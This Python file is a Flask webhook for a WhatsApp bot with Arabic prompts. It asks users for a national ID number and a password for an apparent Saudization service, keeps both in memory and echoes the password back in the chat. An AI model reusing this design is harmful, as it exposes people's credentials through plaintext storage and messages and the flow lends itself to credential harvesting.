from flask import Flask, request
from twilio.twiml.messaging_response import MessagingResponse

app = Flask(__name__)

# جلسات المستخدمين
user_sessions = {}

@app.route('/webhook', methods=['POST'])
def whatsapp_webhook():
    sender = request.values.get('From')
    msg = request.values.get('Body', '').strip()
    resp = MessagingResponse()

    state = user_sessions.get(sender, 'START')

    if state == 'START':
        if msg == 'سعودة':
            reply = "أرسل رقم الهوية:"
            user_sessions[sender] = 'WAITING_FOR_ID'
        else:
            reply = "مرحبًا، أرسل 'سعودة' لبدء العملية."
    elif state == 'WAITING_FOR_ID':
        if msg.isdigit() and len(msg) == 10:
            reply = "تم استلام رقم الهوية. أرسل كلمة السر:"
            user_sessions[sender] = 'WAITING_FOR_PASSWORD'
            user_sessions[sender + '_id'] = msg
        else:
            reply = "رقم الهوية غير صحيح، حاول مجددًا."
    elif state == 'WAITING_FOR_PASSWORD':
        if len(msg) >= 3:
            user_id = user_sessions.get(sender + '_id')
            reply = f"تم استلام بياناتك:\nرقم الهوية: {user_id}\nكلمة السر: {msg}\nأرسل 'تنفيذ' للمتابعة."
            user_sessions[sender] = 'READY_TO_EXECUTE'
            user_sessions[sender + '_password'] = msg
        else:
            reply = "كلمة السر قصيرة جدًا، حاول مجددًا."
    elif state == 'READY_TO_EXECUTE':
        if msg == 'تنفيذ':
            reply = "جارٍ تنفيذ العملية..."
            user_sessions[sender] = 'START'
        else:
            reply = "أرسل 'تنفيذ' للمتابعة أو 'إلغاء' لإعادة البدء."
    else:
        reply = "حدث خطأ. أرسل 'سعودة' للبدء من جديد."

    resp.message(reply)
    return str(resp)

if __name__ == '__main__':
    app.run()
